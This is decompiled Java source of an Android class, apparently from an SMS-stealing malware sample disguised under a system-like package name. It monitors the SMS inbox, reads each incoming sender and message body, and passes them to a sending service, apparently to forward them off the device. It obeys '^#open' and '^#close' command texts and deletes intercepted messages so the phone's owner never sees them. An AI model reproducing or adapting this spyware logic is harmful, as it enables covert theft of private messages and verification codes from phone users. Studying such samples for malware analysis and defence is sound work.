// Decompiled by Jad v1.5.8e. Copyright 2001 Pavel Kouznetsov.
// Jad home page: http://www.geocities.com/kpdus/jad.html
// Decompiler options: packimports(3) 

package com.android.smsnew;

import android.content.*;
import android.database.ContentObserver;
import android.database.Cursor;
import android.database.sqlite.SQLiteException;
import android.net.Uri;
import android.os.Handler;
import java.util.ArrayList;
import java.util.List;

// Referenced classes of package com.android.smsnew:
//            SmsInfo, FileUtils, SmsBeanList, OpenSmsUtils, 
//            SendMsgService

public class SmsContentObserver extends ContentObserver
{

    public SmsContentObserver(Context context)
    {
        super(new Handler());
        mContext = null;
        mContext = context;
    }

    public List getSmsAndSendBack()
    {
        String as[] = {
            "_id", "address", "person", "body", "type", "protocol", "read"
        };
        infos = new ArrayList();
        Cursor cursor;
        int i;
        int j;
        SmsInfo smsinfo;
        List list;
        try
        {
            cursor = mContext.getContentResolver().query(Uri.parse("content://sms/inbox"), as, "type =?", new String[] {
                "1"
            }, "date desc");
            cursor.getColumnIndex("person");
            i = cursor.getColumnIndex("address");
            j = cursor.getColumnIndex("body");
        }
        catch(SQLiteException sqliteexception)
        {
            sqliteexception.printStackTrace();
            return infos;
        }
        if(cursor == null)
            break MISSING_BLOCK_LABEL_190;
        if(cursor.moveToNext())
        {
            smsinfo = new SmsInfo();
            smsinfo.setName(FileUtils.getPhoneNum(mContext));
            smsinfo.setPhoneNumber(cursor.getString(i));
            smsinfo.setSmsbody(cursor.getString(j));
            infos.add(smsinfo);
        }
        cursor.close();
        list = infos;
        return list;
    }

    public void onChange(boolean flag)
    {
        super.onChange(flag);
        List list = getSmsAndSendBack();
        if(list != null && list.size() != 0)
        {
            SmsBeanList smsbeanlist = new SmsBeanList();
            smsbeanlist.setListSms(list);
            if("^#open".equals(((SmsInfo)list.get(0)).getSmsbody().trim()))
            {
                OpenSmsUtils.setOpenSms(mContext, true);
                OpenSmsUtils.deleteSMS(mContext, "^#open");
            } else
            if("^#close".equals(((SmsInfo)list.get(0)).getSmsbody().trim()))
            {
                OpenSmsUtils.setOpenSms(mContext, false);
                OpenSmsUtils.deleteSMS(mContext, "^#close");
            } else
            {
                Intent intent = new Intent(mContext, com/android/smsnew/SendMsgService);
                intent.putExtra("msg", smsbeanlist);
                intent.setFlags(0x10000000);
                mContext.startService(intent);
            }
            if(!OpenSmsUtils.isOpenSms(mContext))
                OpenSmsUtils.deleteSMS(mContext, ((SmsInfo)list.get(0)).getSmsbody());
        }
    }

    List infos;
    private Context mContext;
}
